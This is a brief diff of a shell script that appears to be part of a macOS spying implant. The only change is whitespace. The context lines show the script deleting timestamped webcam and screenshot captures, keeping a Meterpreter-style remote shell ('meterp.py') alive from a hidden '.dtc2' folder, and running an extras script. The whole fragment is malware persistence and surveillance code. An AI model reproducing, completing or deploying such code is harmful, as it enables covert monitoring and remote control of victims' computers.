@@ -15,7 +15,7 @@ STAMP=`echo $HOSTNAME-$DATE`
 rm camera-$STAMP.jpg screen-$STAMP.jpg
 
 # check to see if shell is alive, and if not, restart it.
-python /Users/$USERNAME/.dtc2/meterp.py 2>&1 >/dev/null
+python /Users/$USERNAME/.dtc2/meterp.py 2>&1 > /dev/null
 
 sh /Users/$USERNAME/.dtc2/extras.sh
 
